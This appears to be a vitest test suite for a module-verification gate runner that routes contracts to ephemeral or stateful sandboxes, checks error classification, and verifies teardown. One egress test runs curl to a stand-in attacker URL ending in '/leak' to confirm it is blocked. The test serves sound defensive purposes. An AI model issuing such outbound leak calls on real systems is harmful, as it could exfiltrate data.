import { describe, it, expect } from 'vitest';
import type { ModuleContract } from '@fable/contracts';
import {
  GateRunner,
  EphemeralSandbox,
  StatefulSandbox,
} from '../src/index.js';

describe('Gate Runner & Dual Sandbox Isolation Suite', () => {
  const pureCodeContract: ModuleContract = {
    id: 'contract-utils',
    name: 'string-utils',
    version: '1.0.0',
    description: 'Pure utility functions',
    inputs: {},
    outputs: {},
    stateHooks: false, // -> Path A
    dependencies: [],
    requiredGates: ['L0', 'L1a'],
    executionBudgetMs: 30000,
    author: 'dev',
    createdAt: new Date().toISOString(),
  };

  const statefulContract: ModuleContract = {
    id: 'contract-database',
    name: 'order-db',
    version: '2.0.0',
    description: 'Order service schema with Prisma migrations',
    inputs: {},
    outputs: {},
    stateHooks: true, // -> Path B
    dependencies: [],
    requiredGates: ['L0', 'L1a', 'L3'],
    executionBudgetMs: 120000,
    author: 'db-architect',
    createdAt: new Date().toISOString(),
  };

  it('routes pure code to Path A Ephemeral Sandbox and executes L0/L1a', async () => {
    const verdicts = await GateRunner.executeModuleVerification({
      workflowId: 'wf-gate-001',
      nodeId: 'node-pure',
      contract: pureCodeContract,
    });

    expect(verdicts.length).toBe(2);
    expect(verdicts[0]?.gate).toBe('L0');
    expect(verdicts[0]?.status).toBe('PASS');
    expect(verdicts[0]?.sandboxPath).toBe('PATH_A_EPHEMERAL');

    expect(verdicts[1]?.gate).toBe('L1a');
    expect(verdicts[1]?.status).toBe('PASS');
    expect(verdicts[1]?.sandboxPath).toBe('PATH_A_EPHEMERAL');
  });

  it('routes stateHooks modules to Path B Stateful Sandbox and executes L3', async () => {
    const verdicts = await GateRunner.executeModuleVerification({
      workflowId: 'wf-gate-002',
      nodeId: 'node-stateful',
      contract: statefulContract,
    });

    expect(verdicts.length).toBe(3);
    const l3Verdict = verdicts.find(v => v.gate === 'L3');
    expect(l3Verdict).toBeDefined();
    expect(l3Verdict?.status).toBe('PASS');
    expect(l3Verdict?.sandboxPath).toBe('PATH_B_STATEFUL');
  });

  it('distinguishes code failures from infrastructure errors', async () => {
    // Code failure (syntax error)
    const syntaxVerdicts = await GateRunner.executeModuleVerification({
      workflowId: 'wf-gate-003',
      nodeId: 'node-syntax-err',
      contract: pureCodeContract,
      simulateSyntaxError: true,
    });

    expect(syntaxVerdicts[0]?.status).toBe('FAIL');
    expect(syntaxVerdicts[0]?.errorDetails[0]).toContain('SyntaxError');

    // Infra error
    const infraVerdicts = await GateRunner.executeModuleVerification({
      workflowId: 'wf-gate-004',
      nodeId: 'node-infra-err',
      contract: pureCodeContract,
      simulateInfraError: true,
    });

    expect(infraVerdicts[0]?.status).toBe('INFRA_ERROR');
    expect(infraVerdicts[0]?.errorDetails[0]).toContain('infrastructure failure');
  });

  it('enforces network egress allowlist in Ephemeral Sandbox', async () => {
    const sandbox = new EphemeralSandbox({
      jobId: 'sec-test',
      egressAllowlist: ['minio.internal', 'llm-gateway.internal'],
    });

    // Allowed destination
    const resAllowed = await sandbox.executeCommand('curl', ['https://llm-gateway.internal/v1/models']);
    expect(resAllowed.exitCode).toBe(0);

    // Blocked external destination
    const resBlocked = await sandbox.executeCommand('curl', ['https://malicious-external-site.com/leak']);
    expect(resBlocked.exitCode).toBe(1);
    expect(resBlocked.stderr).toContain('Egress blocked');

    await sandbox.destroy();
    expect(sandbox.isDestroyed()).toBe(true);
  });

  it('guarantees stateful database resources are destroyed on teardown', async () => {
    const stateful = new StatefulSandbox({ jobId: 'dry-run-001' });
    expect(stateful.hasActiveResources()).toBe(true);

    const res = await stateful.executeCommand('prisma migrate deploy');
    expect(res.exitCode).toBe(0);
    expect(res.stdout).toContain('Applied migration successfully');

    await stateful.destroy();
    expect(stateful.isDestroyed()).toBe(true);
    expect(stateful.hasActiveResources()).toBe(false);

    // Further execution on destroyed sandbox must fail
    await expect(stateful.executeCommand('prisma migrate status')).rejects.toThrow('already been torn down');
  });
});
